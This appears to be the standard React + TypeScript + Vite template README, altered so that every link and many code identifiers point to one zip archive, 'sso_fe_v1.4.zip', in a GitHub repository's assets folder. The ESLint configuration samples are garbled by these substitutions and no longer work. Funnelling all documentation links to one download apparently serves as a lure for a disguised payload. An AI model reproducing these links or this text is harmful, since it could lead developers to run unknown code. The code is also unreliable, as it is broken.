# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) uses [Babel](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) uses [SWC](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip and replace with this
      https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,
      // Alternatively, use this for stricter rules
      https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,
      // Optionally, add this for stylistic rules
      https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip', 'https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip'],
        tsconfigRootDir: https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) and [eslint-plugin-react-dom](https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip) for React-specific lint rules:

```js
// https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip', 'https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip'],
        tsconfigRootDir: https://github.com/Rajesh660/sso-fe/raw/refs/heads/main/src/assets/sso_fe_v1.4.zip,
      },
      // other options...
    },
  },
])
```
